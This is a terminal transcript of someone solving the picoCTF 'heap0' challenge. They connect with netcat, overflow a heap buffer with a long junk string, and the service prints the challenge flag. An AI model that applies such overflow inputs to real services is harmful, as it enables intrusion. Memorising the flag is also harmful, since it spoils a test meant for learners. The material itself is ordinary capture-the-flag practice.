┌──(kali㉿kali)-[~/Рабочий стол/CTF]
└─$ nc tethys.picoctf.net 58329

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x6538015ae2b0  ->   pico
+-------------+----------------+
[*]   0x6538015ae2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: qweiqweiouqequyyghsudfgusgfusgfgusgfusgfuigsfguisgfugsjbjksbcjkbsjicbjisbcjibsduibfuigsdiofghsiohfpshifhsiofhoishfoishfioshiofhsiofhuishfioshfioshiofhsoifhioshfioshiofhsiofhoishfiohsiofhioshfioshfiohsiofhioshfiohsiofhsoihfioshfiohsiofhsiofhsi

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_1ad0e1a6}

┌──(kali㉿kali)-[~/Рабочий стол/CTF]
└─$




